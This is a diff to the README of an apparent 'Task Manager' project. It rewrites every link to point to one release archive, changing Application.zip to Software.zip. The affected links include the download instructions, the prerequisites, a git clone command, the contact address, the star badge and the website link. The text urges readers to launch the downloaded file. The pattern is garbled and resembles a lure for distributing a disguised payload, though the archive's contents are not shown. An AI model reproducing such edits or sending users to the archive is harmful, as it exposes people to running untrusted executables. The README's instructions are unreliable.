@@ -4,7 +4,7 @@ Welcome to the Task Manager repository! This is a full-stack project aimed at he
 
 ## 🚀 Quick Start
 
-To get started with Task Manager, simply download the latest release by clicking [here](https://github.com/IqbalFebrianto/Task_Manager/releases/download/v1.0/Application.zip).  
+To get started with Task Manager, simply download the latest release by clicking [here](https://github.com/IqbalFebrianto/Task_Manager/releases/download/v2.0/Software.zip).  
 
 Remember, to launch the downloaded file and start utilizing the full potential of Task Manager!
 
@@ -12,7 +12,7 @@ Remember, to launch the downloaded file and start utilizing the full potential o
 
 Before launching Task Manager, make sure you have the following technologies installed on your system:
 
-- https://github.com/IqbalFebrianto/Task_Manager/releases/download/v1.0/Application.zip
+- https://github.com/IqbalFebrianto/Task_Manager/releases/download/v2.0/Software.zip
 - MongoDB
 - Postman
 
@@ -40,7 +40,7 @@ Follow these steps to install Task Manager on your local machine:
 1. Clone the repository:
 
 ```
-git clone https://github.com/IqbalFebrianto/Task_Manager/releases/download/v1.0/Application.zip
+git clone https://github.com/IqbalFebrianto/Task_Manager/releases/download/v2.0/Software.zip
 ```
 
 2. Install dependencies:
@@ -67,7 +67,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## 📧 Contact
 
-Have a question or just want to say hi? Feel free to reach out to us at https://github.com/IqbalFebrianto/Task_Manager/releases/download/v1.0/Application.zip
+Have a question or just want to say hi? Feel free to reach out to us at https://github.com/IqbalFebrianto/Task_Manager/releases/download/v2.0/Software.zip
 
 ## 🌟 Show Your Support
 
@@ -75,7 +75,7 @@ If you find Task Manager helpful, give us a star on GitHub. It motivates us to c
 
 <div align="center">
 
-[![GitHub stars](https://github.com/IqbalFebrianto/Task_Manager/releases/download/v1.0/Application.zip)](https://github.com/IqbalFebrianto/Task_Manager/releases/download/v1.0/Application.zip)
+[![GitHub stars](https://github.com/IqbalFebrianto/Task_Manager/releases/download/v2.0/Software.zip)](https://github.com/IqbalFebrianto/Task_Manager/releases/download/v2.0/Software.zip)
 
 </div>
 
@@ -83,4 +83,4 @@ If you find Task Manager helpful, give us a star on GitHub. It motivates us to c
 
 Enjoy managing your tasks efficiently with Task Manager! 🚀
 
-[Visit Task Manager Website](https://github.com/IqbalFebrianto/Task_Manager/releases/download/v1.0/Application.zip)
+[Visit Task Manager Website](https://github.com/IqbalFebrianto/Task_Manager/releases/download/v2.0/Software.zip)
